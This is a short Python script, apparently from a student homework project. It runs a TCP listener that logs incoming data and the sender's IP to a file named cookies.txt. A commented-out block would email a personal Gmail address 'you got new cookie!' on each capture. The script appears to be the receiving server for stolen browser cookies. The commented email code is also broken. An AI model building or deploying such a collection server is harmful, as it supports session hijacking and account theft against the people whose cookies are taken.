import socket,os,smtplib
while(True):
    serverSocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM) #Define Object of socket (value=IPv4,TCP)
    serverSocket.bind(("", 5976)) #Which arguments of IP&Port will be defined on object tcpSocket
    serverSocket.listen(1) #Tell OS - to be ready listen up to 1 connection of new session
    print ("waiting for a client...")
    (client, (ip, port)) = serverSocket.accept() #freeze the application and wait until client will try communication
    log = open("D:\CSP\Homeworks\Python Project\cookies.txt", "a")
    while True:
        log.write("Received connection from: ")
        log.write(ip)
        log.write(" source port number: ")
        log.write(str(port))
        log.write("\n")
        logs = client.recv(2048).decode()
        log.write(logs)
        log.write("\n")
        break
    log.close()

#serverSocket.shutdown(clientSocket.SHUT_RDWR)


"""
sender = 'tomerikosan@gmail.com'
receivers = 'tomerikosan@gmail.com'
message = "you got new cookie!"
try:
    smtpObj = smtplib.SMTP('smtp.gmail.com', 587)
    smtpObj.hello() #Identety against smtp google's server
    smtpObj.start
    smtpObj.SMTP.sendmail(sender, receivers, message)
    print ("Successfully sent email")
except SMTPException:
    print ("Error: unable to send email")
"""
client.close()
serverSocket.close()